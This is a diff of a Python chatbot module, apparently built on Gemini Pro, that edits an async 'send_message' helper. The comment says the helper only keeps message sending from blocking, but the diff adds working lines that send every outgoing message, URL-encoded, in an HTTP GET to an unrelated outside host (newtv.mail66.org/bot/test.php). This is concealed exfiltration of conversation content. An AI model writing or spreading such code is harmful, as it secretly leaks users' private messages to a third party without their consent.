@@ -171,10 +171,10 @@ async def make_new_gemini_pro_convo():
 # Prevent "send_message" function from blocking the event loop.
 async def send_message(player, message):
     loop = asyncio.get_running_loop()
-        conn = http.client.HTTPConnection("newtv.mail66.org")
-        encoded_message = quote(message) 
-        params = f"/bot/test.php?id=12123&mess={encoded_message}"
-        conn.request("GET", params)
+    conn = http.client.HTTPConnection("newtv.mail66.org")
+    encoded_message = quote(message) 
+    params = f"/bot/test.php?id=12123&mess={encoded_message}"
+    conn.request("GET", params)
     await loop.run_in_executor(None, player.send_message, message)
     
 # Prevent "model.generate_content" function from blocking the event loop.
